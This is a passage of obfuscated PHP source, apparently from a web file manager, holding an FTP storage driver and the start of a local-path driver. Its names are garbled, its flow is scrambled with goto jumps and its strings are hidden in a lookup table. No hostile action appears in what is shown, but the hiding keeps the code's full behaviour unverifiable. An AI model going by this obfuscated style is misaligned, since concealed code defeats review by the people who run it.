$EÏÄ‰ˆˆ¬[1119]; goto EĞÇí²½òó; EĞÇí²½òó: $eÎ„±¥©”¯ = $EÏÄ‰ˆˆ¬[59]; $fˆ¹àï– = gmdate($EÏÄ‰ˆˆ¬[1120]); $e‡¥ŠÆà‰ = gmdate($EÏÄ‰ˆˆ¬[683]); goto bß§†©Áø; AØ·Ñ¥Œ™»: $DŠîê˜µË½ = array($EÏÄ‰ˆˆ¬[195] => $EÏÄ‰ˆˆ¬[33], $EÏÄ‰ˆˆ¬[1131] => $EÏÄ‰ˆˆ¬[33], $EÏÄ‰ˆˆ¬[1090] => $eÛ‰Á·ö¡†, $EÏÄ‰ˆˆ¬[1094] => $fÆ¢ÔœÊµ, $EÏÄ‰ˆˆ¬[1098] => $Eƒå‘İ–˜‰, $EÏÄ‰ˆˆ¬[1132] => $DñÂ¬óå“ˆ, $EÏÄ‰ˆˆ¬[1133] => $e¼«ì‹”, $EÏÄ‰ˆˆ¬[1134] => $fˆ¹àï–, $EÏÄ‰ˆˆ¬[1135] => $CÄ·¬“Ô­É, $EÏÄ‰ˆˆ¬[1136] => $b»–øäó±š, $EÏÄ‰ˆˆ¬[165] => $this->getHost()); return $DŠîê˜µË½; goto c–Ü¨‹¿“; f„£õèºæ„: $Eƒå‘İ–˜‰ = base64_encode(json_encode($cÎè•Ä½‹›)); $B›Ğùáª­‡ = hash_hmac($EÏÄ‰ˆˆ¬[1129], $e‡¥ŠÆà‰, $EÏÄ‰ˆˆ¬[1130] . $this->secret, !0); $Cğ¸Ö‚¸³Û = hash_hmac($EÏÄ‰ˆˆ¬[1129], $this->region, $B›Ğùáª­‡, !0); goto F÷ë²ô¤Ïã; c–Ü¨‹¿“: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($DÒ¢Š’¬½) { parent::__construct(); if (count($DÒ¢Š’¬½) > 0) { $this->_init($DÒ¢Š’¬½); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($fá’©ª é) { $aé¡âØ¬ =& $_SERVER[Ö]; global $config; $this->appCharset = $config[$aé¡âØ¬[1137]]; $this->systemCharset = $config[$aé¡âØ¬[1138]]; if (isset($fá’©ª é[$aé¡âØ¬[1139]]) && $fá’©ª é[$aé¡âØ¬[1139]]) { $this->systemCharset = $fá’©ª é[$aé¡âØ¬[1139]]; } } public function iconvApp($dîËÁ¼ßæÀ) { return $this->iconvTo($dîËÁ¼ßæÀ, $this->systemCharset, $this->appCharset); } public function iconvSystem($c’ó„åÏ) { return $this->iconvTo($c’ó„åÏ, $this->appCharset, $this->systemCharset); } public function getPathOuter($cÔÇ¶ïÎ‚”) { goto fŠÛœÅõ´ƒ; Dæâ÷õß¥“: $cÔÇ¶ïÎ‚” = KodIO::clear($cÔÇ¶ïÎ‚”); $cÔÇ¶ïÎ‚” = substr($cÔÇ¶ïÎ‚”, strlen($fÜÁŒ¨êÃ)); if (empty($this->pathDriver)) { return $cÔÇ¶ïÎ‚”; } goto cêëïôÍµ©; d¡é…˜ÎËæ: if (substr($fÜÁŒ¨êÃ, 0, 2) == $aµƒøƒ©Ì[1140]) { $fÜÁŒ¨êÃ = BASIC_PATH . substr($fÜÁŒ¨êÃ, 2); } if (substr($cÔÇ¶ïÎ‚”, 0, 2) == $aµƒøƒ©Ì[1140]) { $cÔÇ¶ïÎ‚” = BASIC_PATH . substr($cÔÇ¶ïÎ‚”, 2); } $fÜÁŒ¨êÃ = KodIO::clear($fÜÁŒ¨êÃ); goto Dæâ÷õß¥“; cêëïôÍµ©: return $this->pathDriver . $aµƒøƒ©Ì[8] . ltrim($cÔÇ¶ïÎ‚”, $aµƒøƒ©Ì[8]); goto FÎ¼‘ŠÁ¸Û; fŠÛœÅõ´ƒ: $aµƒøƒ©Ì =& $_SERVER[Ö]; $fÜÁŒ¨êÃ = $this->iconvApp($this->pathBase); $cÔÇ¶ïÎ‚” = $this->iconvApp($cÔÇ¶ïÎ‚”); goto d¡é…˜ÎËæ; FÎ¼‘ŠÁ¸Û: } private function _init($Eš«—Ôî…Œ = array()) { goto A‰µ¿Â¦¯Ş; EÍô´«©‰Í: return $CøÜ¡‰Á; goto cŒ„„£ÊœŸ; d†ŒÛ…Ù¸Ê: if (isset($EŞì„‚Š’µ[$E ë†¯‘Æ])) { foreach ($EŞì„‚Š’µ[$E ë†¯‘Æ] as $DåÜÍİÊšó => $a‡ë‘„À³) { $this->{$DåÜÍİÊšó} = $a‡ë‘„À³; } return !0; } $BÅî¤‡åº = parse_url(trim($this->server, $A§ä…ÓÆÍª[8])); $this->host = $BÅî¤‡åº[$A§ä…ÓÆÍª[165]]; goto F£Êà²¡; F£Êà²¡: $EÙÈéÜôë¾ = isset($BÅî¤‡åº[$A§ä…ÓÆÍª[164]]) && $BÅî¤‡åº[$A§ä…ÓÆÍª[164]] == $A§ä…ÓÆÍª[1143] ? !0 : !1; $this->scheme = $EÙÈéÜôë¾ ? $A§ä…ÓÆÍª[1144] : $A§ä…ÓÆÍª[1145]; $this->port = isset($BÅî¤‡åº[$A§ä…ÓÆÍª[166]]) ? $BÅî¤‡åº[$A§ä…ÓÆÍª[166]] : 21; goto bÜÚôƒ §; bÜÚôƒ §: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $CøÜ¡‰Á = @ftp_login($this->connect, $this->username, $this->userpass); goto fŒ×ÌÈÒ; fŒ×ÌÈÒ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $EŞì„‚Š’µ[$E ë†¯‘Æ] = array($A§ä…ÓÆÍª[1146] => $this->connect, $A§ä…ÓÆÍª[165] => $this->host, $A§ä…ÓÆÍª[164] => $this->scheme, $A§ä…ÓÆÍª[166] => $this->port); goto EÍô´«©‰Í; A‰µ¿Â¦¯Ş: $A§ä…ÓÆÍª =& $_SERVER[Ö]; if (!function_exists($A§ä…ÓÆÍª[1141])) { show_json(LNG($A§ä…ÓÆÍª[1142]), !1); } $this->charsetReset($Eš«—Ôî…Œ); goto c÷˜¯… ½Â; c÷˜¯… ½Â: foreach ($Eš«—Ôî…Œ as $DåÜÍİÊšó => $a‡ë‘„À³) { if (isset($this->{$DåÜÍİÊšó})) { $this->{$DåÜÍİÊšó} = $a‡ë‘„À³; } } static $EŞì„‚Š’µ = array(); $E ë†¯‘Æ = md5(json_encode($Eš«—Ôî…Œ)); goto d†ŒÛ…Ù¸Ê; cŒ„„£ÊœŸ: } private function _isconn() { return is_resource($this->connect); } public function mkfile($böÀÒ±¢Û, $Bè’ç§å¿í = '', $Eƒ„Äáù¥Ö = REPEAT_RENAME) { if ($this->setContent($böÀÒ±¢Û, $Bè’ç§å¿í)) { return $this->getPathOuter($böÀÒ±¢Û); } return !1; } public function mkdir($B¿ùáÕùÙ, $E¸Ïè·Ú× = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $B¿ùáÕùÙ = $this->iconvSystem($B¿ùáÕùÙ); if ($this->isFolder($B¿ùáÕùÙ) || @ftp_mkdir($this->connect, $B¿ùáÕùÙ)) { return $this->getPathOuter($B¿ùáÕùÙ); } if (!$this->mkdir($this->pathFather($B¿ùáÕùÙ))) { return !1; } if ($B¿ùáÕùÙ = @ftp_mkdir($this->connect, $B¿ùáÕùÙ)) { return $this->getPathOuter($B¿ùáÕùÙ); } return !1; } public function copyFile($BÆƒÌç¦«½, $cÅèä±½Á) { goto b”ÀÕ¿Àñº; b”ÀÕ¿Àñº: if (!$this->_isconn()) { return !1; } $f´ø™•¸Ü‚ = $this->pathThis($this->iconvSystem($BÆƒÌç¦«½)); $Bƒ³š¤½¼´ = $this->tempFile($f´ø™•¸Ü‚); goto F¢Ã™ã¿«‹; d÷»Õøç®º: $this->tempFileRemve($Bƒ³š¤½¼´); return $AÁ›ÎÅ­Í; goto F˜Î¶Î°‚â; F¢Ã™ã¿«‹: $f¤Ã²Ä¯ = $this->iconvApp($Bƒ³š¤½¼´); $this->download($BÆƒÌç¦«½, $f¤Ã²Ä¯); $AÁ›ÎÅ­Í = $this->upload($cÅèä±½Á, $f¤Ã²Ä¯); goto d÷»Õøç®º; F˜Î¶Î°‚â: } public function moveFile($EáîÜÏ¤é, $FÚÏ¦Œ­Ø) { if (!$this->_isconn()) { return !1; } $EáîÜÏ¤é = $this->iconvSystem($EáîÜÏ¤é); $FÚÏ¦Œ­Ø = $this->iconvSystem($FÚÏ¦Œ­Ø); $CÆ³ŸÔ±â = @ftp_rename($this->connect, $EáîÜÏ¤é, $FÚÏ¦Œ­Ø); return $CÆ³ŸÔ±â ? $this->getPathOuter($FÚÏ¦Œ­Ø) : !1; } public function delFile($eêî“„ùŸ ) { if (!$this->_isconn()) { return !1; } $eêî“„ùŸ  = $this->iconvSystem($eêî“„ùŸ ); return @ftp_delete($this->connect, $eêî“„ùŸ ); } public function delFolder($F’Úà®ŞÌ») { if (!$this->_isconn()) { return !1; } $F’Úà®ŞÌ» = $this->iconvSystem($F’Úà®ŞÌ»); $c»Éè¯õ° = $this->ftpList($F’Úà®ŞÌ»); if (!$c»Éè¯õ°) { return @ftp_rmdir($this->connect, $F’Úà®ŞÌ»); } foreach ($c»Éè¯õ° as $aó£Ã‰¹ƒ’) { if ($this->isFolder($aó£Ã‰¹ƒ’)) { $aó£Ã‰¹ƒ’ = $this->iconvApp($aó£Ã‰¹ƒ’); $this->delFolder($aó£Ã‰¹ƒ’); } else { @ftp_delete($this->connect, $aó£Ã‰¹ƒ’); } } return @ftp_rmdir($this->connect, $F’Úà®ŞÌ»); } public function rename($e—›Á·ôÑñ, $B§¦¬Áê») { goto B ¨ºÙö¸Ê; fäë™Ø‚Óµ: $fÙŠÀîáÜÄ = $this->iconvSystem($fÙŠÀîáÜÄ); $e—›Á·ôÑñ = $this->iconvSystem($e—›Á·ôÑñ); $C¼ÚÈç·¸Â = $this->pathFather($e—›Á·ôÑñ); goto d˜«óóÕ; d˜«óóÕ: $Eê½Æ–©ê£ = rtrim($C¼ÚÈç·¸Â, $dÙ¢á¬Ã ƒ[8]) . $dÙ¢á¬Ã ƒ[8] . $fÙŠÀîáÜÄ; $Bƒ«ÂÆ—µñ = @ftp_rename($this->connect, $e—›Á·ôÑñ, $Eê½Æ–©ê£); $Eê½Æ–©ê£ = $this->iconvApp($Eê½Æ–©ê£); goto CÆ«ªÂÎøÜ; B ¨ºÙö¸Ê: $dÙ¢á¬Ã ƒ =& $_SERVER[Ö]; if (!$this->_isconn()) { return !1; } $fÙŠÀîáÜÄ = $this->fileNameAuto($this->pathFather($e—›Á·ôÑñ), $B§¦¬Áê»); goto fäë™Ø‚Óµ; CÆ«ªÂÎøÜ: return $Bƒ«ÂÆ—µñ ? $this->getPathOuter($Eê½Æ–©ê£) : !1; goto dÅ—ŒÍæÌ; dÅ—ŒÍæÌ: } private function folderInfo($eÂÜ×šÑ•Ñ, $a¥Ä”¢ğº± = false) { goto E†÷¬Â¨; E†÷¬Â¨: $aÊ¡”¾Ğ‘é =& $_SERVER[Ö]; $föóƒÖÊ˜¸ = $this->getPathOuter(rtrim($eÂÜ×šÑ•Ñ, $aÊ¡”¾Ğ‘é[8])); $f“ÕÌ­À‘ = $this->pathThis($föóƒÖÊ˜¸); goto CÎ¯½Ä¢¬È; b„‘«˜‡ã: return $aã­´ÚŠ¯; goto eôáäÜœÆ; CÎ¯½Ä¢¬È: $bØ¡Çİé¾ = $this->iconvSystem($eÂÜ×šÑ•Ñ); if ($a¥Ä”¢ğº±) { return array($aÊ¡”¾Ğ‘é[28] => $f“ÕÌ­À‘, $aÊ¡”¾Ğ‘é[75] => $föóƒÖÊ˜¸, $aÊ¡”¾Ğ‘é[29] => $aÊ¡”¾Ğ‘é[76]); } $aã­´ÚŠ¯ = array($aÊ¡”¾Ğ‘é[28] => $f“ÕÌ­À‘, $aÊ¡”¾Ğ‘é[75] => $föóƒÖÊ˜¸, $aÊ¡”¾Ğ‘é[29] => $aÊ¡”¾Ğ‘é[76], $aÊ¡”¾Ğ‘é[183] => 0, $aÊ¡”¾Ğ‘é[106] => 0, $aÊ¡”¾Ğ‘é[1147] => !0, $aÊ¡”¾Ğ‘é[1148] => !0); goto b„‘«˜‡ã; eôáäÜœÆ: } private function fileInfo($e³‰±§Ã‰Î, $aîé”÷µØ = false) { goto E‘´™ƒ™¢‹; dİ« í¤ó¾: $e§Ÿ¼Ú°æÜ[$cäÔ…¬‘“[106]] = $e§Ÿ¼Ú°æÜ[$cäÔ…¬‘“[106]] > 0 ? $e§Ÿ¼Ú°æÜ[$cäÔ…¬‘“[106]] : 0; return $e§Ÿ¼Ú°æÜ; goto c½ğëµ¼æ; fÀÑ×ªÄÖ: $Cå–§´´§Ô = $this->iconvSystem($e³‰±§Ã‰Î); if ($aîé”÷µØ) { return array($cäÔ…¬‘“[28] => $a•‚¨ÃšŠŒ, $cäÔ…¬‘“[75] => $aîğ„ê‹®, $cäÔ…¬‘“[29] => $cäÔ…¬‘“[163], $cäÔ…¬‘“[156] => $this->ext($e³‰±§Ã‰Î), $cäÔ…¬‘“[77] => $this->size($e³‰±§Ã‰Î)); } $e§Ÿ¼Ú°æÜ = array($cäÔ…¬‘“[28] => $a•‚¨ÃšŠŒ, $cäÔ…¬‘“[75] => $aîğ„ê‹®, $cäÔ…¬‘“[29] => $cäÔ…¬‘“[163], $cäÔ…¬‘“[183] => 0, $cäÔ…¬‘“[106] => @ftp_mdtm($this->connect, $Cå–§´´§Ô), $cäÔ…¬‘“[156] => $this->ext($e³‰±§Ã‰Î), $cäÔ…¬‘“[77] => $this->size($e³‰±§Ã‰Î), $cäÔ…¬‘“[1147] => !0, $cäÔ…¬‘“[1148] => !0); goto dİ« í¤ó¾; E‘´™ƒ™¢‹: $cäÔ…¬‘“ =& $_SERVER[Ö]; $aîğ„ê‹® = $this->getPathOuter(rtrim($e³‰±§Ã‰Î, $cäÔ…¬‘“[8])); $a•‚¨ÃšŠŒ = $this->pathThis($aîğ„ê‹®); goto fÀÑ×ªÄÖ; c½ğëµ¼æ: } public function size($cÊãÕ³çÅë) { $F¹¨­¢ğ = $this->objectMeta($cÊãÕ³çÅë); return $F¹¨­¢ğ ? $F¹¨­¢ğ[$_SERVER[Ö][77]] : 0; } public function info($bŠ´Âø‡ ”) { if ($this->isFile($bŠ´Âø‡ ”)) { return $this->fileInfo($bŠ´Âø‡ ”, 0); } else { if ($this->isFolder($bŠ´Âø‡ ”)) { return $this->folderInfo($bŠ´Âø‡ ”); } } return !1; } public function exist($A¾ˆ°¤”ø¿) { return $this->objectMeta($A¾ˆ°¤”ø¿) ? !0 : !1; } public function isFile($a»ÜùÃ‚ô”) { $c¥Ì±¤˜š· =& $_SERVER[Ö]; $Açöôóòô = $this->objectMeta($a»ÜùÃ‚ô”); return $Açöôóòô ? $Açöôóòô[$c¥Ì±¤˜š·[29]] == $c¥Ì±¤˜š·[163] : !1; } public function isFolder($f‰•Îµˆ±‘) { $Aïä¶‚±‚Í =& $_SERVER[Ö]; $fÅ¡¬‹Òô = $this->objectMeta($f‰•Îµˆ±‘); return $fÅ¡¬‹Òô ? $fÅ¡¬‹Òô[$Aïä¶‚±‚Í[29]] == $Aïä¶‚±‚Í[76] : !1; } public function listPath($BßÂÌ“¬«†, $c‚ä¦å½àÉ = false) { goto f¦ÁÀà†Æ; f¦ÁÀà†Æ: $B¢Ş‘Ë‡ğ =& $_SERVER[Ö]; if (!$this->_isconn()) { return !1; } $BßÂÌ“¬«† = $this->iconvSystem($BßÂÌ“¬«†); goto fÓÖ÷ô„; fÓÖ÷ô„: $c×Õñ’ªµ· = $this->ftpList($BßÂÌ“¬«†); $dî¿•Î¼É = array($B¢Ş‘Ë‡ğ[74] => array(), $B¢Ş‘Ë‡ğ[73] => array()); if (!$c×Õñ’ªµ·) { return $dî¿•Î¼É; } goto DÀáµÖ×Ê; DÀáµÖ×Ê: foreach ($c×Õñ’ªµ· as $BßÂÌ“¬«†) { if ($this->isFolder($BßÂÌ“¬«†)) { $dî¿•Î¼É[$B¢Ş‘Ë‡ğ[74]][] = $this->folderInfo($BßÂÌ“¬«†, $c‚ä¦å½àÉ); } else { $dî¿•Î¼É[$B¢Ş‘Ë‡ğ[73]][] = $this->fileInfo($BßÂÌ“¬«†, $c‚ä¦å½àÉ); } } return $dî¿•Î¼É; goto dœó·ÊÛÆ; dœó·ÊÛÆ: } public function has($aë­‘±šğ, $BğŸÕ¼¡ = false, $BùÅ’ËŠ = true) { goto e›ÍçŸ•Ší; e›ÍçŸ•Ší: $cÂ‰Æ‹×í‘ =& $_SERVER[Ö]; if (!$this->_isconn()) { return !1; } $aë­‘±šğ = $this->iconvSystem($aë­‘±šğ); goto c«›Ñ¿ÛøÌ; F„ä©÷õí: foreach ($A¥ÍŒ»‚®Ã as $aë­‘±šğ) { if ($BùÅ’ËŠ) { if (!$this->isFolder($aë­‘±šğ)) { return !0; } } else { if ($this->isFolder($aë­‘±šğ)) { return !0; } } } return !1; goto aÒ¡‹œˆ¸½; c«›Ñ¿ÛøÌ: $A¥ÍŒ»‚®Ã = $this->ftpList($aë­‘±šğ); if (!$A¥ÍŒ»‚®Ã) { return !1; } if ($BğŸÕ¼¡) { return array($cÂ‰Æ‹×í‘[187] => 0, $cÂ‰Æ‹×í‘[188] => count($A¥ÍŒ»‚®Ã)); } goto F„ä©÷õí; aÒ¡‹œˆ¸½: } public function listAll($cÛ£ÅŸôÉ) { goto døãÎ‘ÊõÁ; døãÎ‘ÊõÁ: $C•’©ñÓÇ¶ =& $_SERVER[Ö]; if (!$this->_isconn()) { return !1; } $cÛ£ÅŸôÉ = $this->iconvSystem($cÛ£ÅŸôÉ); goto aªÛ¨Øç; aªÛ¨Øç: $Fé¾èËÅˆ = array($C•’©ñÓÇ¶[73] => array(), $C•’©ñÓÇ¶[74] => array()); $this->recursionFtpFiles($cÛ£ÅŸôÉ, $Fé¾èËÅˆ); $b¾òòÅŠ›Ù = array(); goto Eªğ¨×Á”; Eªğ¨×Á”: foreach ($Fé¾èËÅˆ[$C•’©ñÓÇ¶[74]] as $e§¦¶ëÇ·) { $b¾òòÅŠ›Ù[] = array($C•’©ñÓÇ¶[75] => $C•’©ñÓÇ¶[8] . trim(str_replace($cÛ£ÅŸôÉ, $C•’©ñÓÇ¶[33], $e§¦¶ëÇ·), $C•’©ñÓÇ¶[8]) . $C•’©ñÓÇ¶[8], $C•’©ñÓÇ¶[76] => 1, $C•’©ñÓÇ¶[77] => 0); } foreach ($Fé¾èËÅˆ[$C•’©ñÓÇ¶[73]] as $DíáˆÓÃÙº) { $b¾òòÅŠ›Ù[] = array($C•’©ñÓÇ¶[75] => $C•’©ñÓÇ¶[8] . trim(str_replace($cÛ£ÅŸôÉ, $C•’©ñÓÇ¶[33], $DíáˆÓÃÙº), $C•’©ñÓÇ¶[8]), $C•’©ñÓÇ¶[76] => 0, $C•’©ñÓÇ¶[77] => $this->size($DíáˆÓÃÙº)); } return $b¾òòÅŠ›Ù; goto aİÀøÁÏè; aİÀøÁÏè: } public function getContent($E¿Ôó”ì¹Û) { if (!$this->_isconn()) { return !1; } $E¿Ôó”ì¹Û = $this->iconvSystem($E¿Ôó”ì¹Û); return $this->fileSubstr($E¿Ôó”ì¹Û); } public function setContent($Cë™¨Ò÷Ï, $aÜ²ÇøØÃ¾ = '') { goto cµ°øÇá—á; cµ°øÇá—á: if (!$this->_isconn()) { return !1; } $EÄØäÎ”Â¬ = $this->pathThis($this->iconvSystem($Cë™¨Ò÷Ï)); $e„ï¶î»ò¦ = $this->tempFile($EÄØäÎ”Â¬); goto DäÍ¨›ˆß‰; FÍ¼±À‘: return $bªö¿æ¿Ïò; goto CáÂÓ¤ÖÏ; DäÍ¨›ˆß‰: file_put_contents($e„ï¶î»ò¦, $aÜ²ÇøØÃ¾); $bªö¿æ¿Ïò = $this->upload($Cë™¨Ò÷Ï, $this->iconvApp($e„ï¶î»ò¦)); $this->tempFileRemve($e„ï¶î»ò¦); goto FÍ¼±À‘; CáÂÓ¤ÖÏ: } public function fileSubstr($e·Äî×Ä, $bôˆÓ‚¨ï = 0, $F­×¬îù·‚ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($e·Äî×Ä, $bôˆÓ‚¨ï, $F­×¬îù·‚); } private function ftpRequest($bôƒ‹åîã, $aåŒË‰†‚ö = 0, $C±àĞ¡´œ‡ = false) { goto bÁ ©¡æâØ; Dƒ‘‰Ñ†˜­: return $BëØ ©¢ï„; goto cåšñ¦óœ; fÄñ©¾°İó: curl_setopt($A’ï­£§µ, CURLOPT_URL, $b†—Àê‡Ìˆ . $this->pathEncode($bôƒ‹åîã)); curl_setopt($A’ï­£§µ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($C±àĞ¡´œ‡) { $BŸ®–†ƒá• = $aåŒË‰†‚ö + $C±àĞ¡´œ‡ - 1; curl_setopt($A’ï­£§µ, CURLOPT_RANGE, "{$aåŒË‰†‚ö}\55{$BŸ®–†ƒá•}"); } goto d¿óÚà‰îØ; bÁ ©¡æâØ: $bôƒ‹åîã = $this->iconvSystem($bôƒ‹åîã); $b†—Àê‡Ìˆ = $this->scheme . $this->host . $_SERVER[Ö][4] . $this->port; $A’ï­£§µ = curl_init(); goto fÄñ©¾°İó; d¿óÚà‰îØ: curl_setopt($A’ï­£§µ, CURLOPT_RETURNTRANSFER, 1); $BëØ ©¢ï„ = curl_exec($A’ï­£§µ); curl_close($A’ï­£§µ); goto Dƒ‘‰Ñ†˜­; cåšñ¦óœ: } public function upload($D‡‡ƒÇ…ò, $d¯¨˜º¿‰, $D©¦µªÄğ® = false, $eµùæÆ‘ = REPEAT_REPLACE) { goto BÊ±½µçŞ; Bç“ëÏÑÉ: $d¯¨˜º¿‰ = $this->iconvSystem($d¯¨˜º¿‰); $Dó‚µÀ’£“ = ftp_nb_put($this->connect, $D‡‡ƒÇ…ò, $d¯¨˜º¿‰, FTP_BINARY); while ($Dó‚µÀ’£“ == FTP_MOREDATA) { $Dó‚µÀ’£“ = ftp_nb_continue($this->connect); } goto a‚½Òİ†»°; BÊ±½µçŞ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($D‡‡ƒÇ…ò))) { return !1; } $D‡‡ƒÇ…ò = $this->iconvSystem($D‡‡ƒÇ…ò); goto Bç“ëÏÑÉ; a‚½Òİ†»°: if ($Dó‚µÀ’£“ != FTP_FINISHED) { return !1; } return $this->getPathOuter($D‡‡ƒÇ…ò); goto eêÖ¹³â…¾; eêÖ¹³â…¾: } public function download($a¸„§µõ¾Ô, $F¿ÂäŠÚ§Ã = '') { goto D¼ô™„®Ó¤; D¼ô™„®Ó¤: if (!$this->_isconn()) { return !1; } $DèˆÔØÌ¨ã = $this->pathFather($F¿ÂäŠÚ§Ã); if (!IO::mkdir($DèˆÔØÌ¨ã)) { return !1; } goto B¡ÑáœĞ¼; B¡ÑáœĞ¼: $a¸„§µõ¾Ô = $this->iconvSystem($a¸„§µõ¾Ô); $F¿ÂäŠÚ§Ã = $this->iconvSystem($F¿ÂäŠÚ§Ã); $bÙÊÎ¿…åĞ = ftp_nb_get($this->connect, $F¿ÂäŠÚ§Ã, $a¸„§µõ¾Ô, FTP_BINARY); goto fÖ½»Ù‹î¿; fÖ½»Ù‹î¿: while ($bÙÊÎ¿…åĞ == FTP_MOREDATA) { $bÙÊÎ¿…åĞ = ftp_nb_continue($this->connect); } if ($bÙÊÎ¿…åĞ != FTP_FINISHED) { return !1; } return $this->iconvApp($F¿ÂäŠÚ§Ã); goto DÕ÷©ë†Æì; DÕ÷©ë†Æì: } private function ftpList($fİ Ğ ò) { goto bÇ ŸÚŸç; f®±ÀË±ÕØ: $BŒÔÊ¿Ö™Œ = array(); foreach ($E´Åí‡Îò as $Fæš¥Ú›÷É) { if ($Fæš¥Ú›÷É == $eÊô÷¬Æõ–[91] || $Fæš¥Ú›÷É == $eÊô÷¬Æõ–[1150]) { continue; } if (!strstr($Fæš¥Ú›÷É, $eÊô÷¬Æõ–[8])) { $Fæš¥Ú›÷É = $fİ Ğ ò . ltrim($Fæš¥Ú›÷É, $eÊô÷¬Æõ–[8]); } $BŒÔÊ¿Ö™Œ[] = $this->iconvApp($Fæš¥Ú›÷É); } return $BŒÔÊ¿Ö™Œ; goto còˆâ¦Õ•ò; bÇ ŸÚŸç: $eÊô÷¬Æõ– =& $_SERVER[Ö]; if (!$this->isFolder($fİ Ğ ò)) { return !1; } @ftp_chdir($this->connect, $eÊô÷¬Æõ–[8]); goto fµ–áÎ“¢Ø; fµ–áÎ“¢Ø: $fİ Ğ ò = rtrim($fİ Ğ ò, $eÊô÷¬Æõ–[8]) . $eÊô÷¬Æõ–[8]; $E´Åí‡Îò = @ftp_nlist($this->connect, $fİ Ğ ò); if ($E´Åí‡Îò === !1) { $E´Åí‡Îò = @ftp_rawlist($this->connect, $fİ Ğ ò); foreach ($E´Åí‡Îò as $Bë¼ë›ĞÎÎ => $ašò¬ù¨ÔÛ) { $E´Åí‡Îò[$Bë¼ë›ĞÎÎ] = end(explode($eÊô÷¬Æõ–[1149], $ašò¬ù¨ÔÛ)); } } goto f®±ÀË±ÕØ; còˆâ¦Õ•ò: } private function recursionFtpFiles($CÊ½çÃÙˆì, &$Cğã‡ó¸Ê’) { $C³‚Ø¸‡ÖØ =& $_SERVER[Ö]; if (!$this->_isconn()) { return !1; } if (!($FÃ’¼³¸©Ä = $this->ftpList($CÊ½çÃÙˆì))) { return !1; } foreach ($FÃ’¼³¸©Ä as $CÊ½çÃÙˆì) { if ($this->isFolder($CÊ½çÃÙˆì)) { $this->recursionFtpFiles($CÊ½çÃÙˆì, $Cğã‡ó¸Ê’); $Cğã‡ó¸Ê’[$C³‚Ø¸‡ÖØ[74]][] = $CÊ½çÃÙˆì; } else { $Cğã‡ó¸Ê’[$C³‚Ø¸‡ÖØ[73]][] = $CÊ½çÃÙˆì; } } } private function objectMeta($CøÉœÔç÷) { goto C–÷‹³­Àò; C–÷‹³­Àò: $Dƒï»‰¨ãÛ =& $_SERVER[Ö]; $eÃÌ›•– = $Dƒï»‰¨ãÛ[1151] . md5($CøÉœÔç÷); $b²ĞèÔÆÍ = Cache::get($eÃÌ›•–); goto aëŞÉóÛÁœ; aëŞÉóÛÁœ: if ($b²ĞèÔÆÍ !== null && $b²ĞèÔÆÍ !== !1) { return $b²ĞèÔÆÍ; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $Dƒï»‰¨ãÛ[8]); goto bÂ³ŞæÛ›‹; DªÁ×Ä‡™ì: return $b²ĞèÔÆÍ; goto D”íÍí­ø; bÂ³ŞæÛ›‹: $fù„À¸“¹Ÿ = @ftp_size($this->connect, $this->iconvSystem($CøÉœÔç÷)); if ($fù„À¸“¹Ÿ != -1) { $b²ĞèÔÆÍ = array($Dƒï»‰¨ãÛ[77] => $fù„À¸“¹Ÿ, $Dƒï»‰¨ãÛ[29] => $Dƒï»‰¨ãÛ[163]); } else { $c®‚ÂŠèİ = @ftp_chdir($this->connect, $this->iconvSystem($CøÉœÔç÷)); $b²ĞèÔÆÍ = $c®‚ÂŠèİ ? array($Dƒï»‰¨ãÛ[77] => 0, $Dƒï»‰¨ãÛ[29] => $Dƒï»‰¨ãÛ[76]) : !1; } Cache::set($eÃÌ›•–, $b²ĞèÔÆÍ, 0); goto DªÁ×Ä‡™ì; D”íÍí­ø: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($f»¿ø¬ÍËÔ) { if (substr($f»¿ø¬ÍËÔ, 0, 2) == $_SERVER[Ö][1140]) { $f»¿ø¬ÍËÔ = BASIC_PATH . substr($f»¿ø¬ÍËÔ, 2); } return $f»¿ø¬ÍËÔ; } public function iconvApp($A¸Ÿ–Á) { $eÇ‘¤˜¯Ã¦ =& $_SERVER[Ö]; global $config; return $this->iconvTo($A¸Ÿ–Á, $config[$eÇ‘¤˜¯Ã¦[1138]], $config[$eÇ‘¤˜¯Ã¦[1137]]); } public function iconvSystem($Fó•¯ì¦ƒ) { $Cæà†ÂŒ’ =& $_SERVER[Ö]; global $config; return $this->iconvTo($Fó•¯ì¦ƒ, $config[$Cæà†ÂŒ’[1137]], $config[$Cæà†ÂŒ’[1138]]); } public function getPathOuter($aìÊ­˜â¾†) { goto FÆå‘ãóçç; e·ÆØêöÂ‡: return $this->pathDriver . $b„¸Õô°“Û[8] . ltrim($aìÊ­˜â¾†, $b„¸Õô°“Û[8]); goto C¦è¿¸‘†¶; FÆå‘ãóçç: $b„¸Õô°“Û =& $_SERVER[Ö]; $E§î—§†ò = $this->iconvApp($this->pathBase); $aìÊ­˜â¾† = $this->iconvApp($aìÊ­˜â¾†); goto C·’¿¡±áç; C·’¿¡±áç: if (substr($E§î—§†ò, 0, 2) == $b„¸Õô°“Û[1140]) { $E§î—§†ò = BASIC_PATH . substr($E§î—§†ò, 2); } if (substr($aìÊ­˜â¾†, 0, 2) == $b„¸Õô°“Û[1140]) { $aìÊ­˜â¾† = BASIC_PATH . substr($aìÊ­˜â¾†, 2); } $E§î—§†ò = KodIO::clear($E§î—§†ò); goto cì¸¬ËáÊ™; cì¸¬ËáÊ™: $aìÊ­˜â¾† = KodIO::clear($aìÊ­˜â¾†); $aìÊ­˜â¾† = substr($aìÊ­˜â¾†, strlen($E§î—§†ò)); if (empty($this->pathDriver)) { return $aìÊ­˜â¾†; } goto e·ÆØêöÂ‡; C¦è¿¸‘†¶: } public function mkfile($dè¤ìØ¦Îò, $EÔšµ™õƒ“ = '', $D‘ŠÄ‰òùÆ = REPEAT_RENAME) { $dè¤ìØ¦Îò = 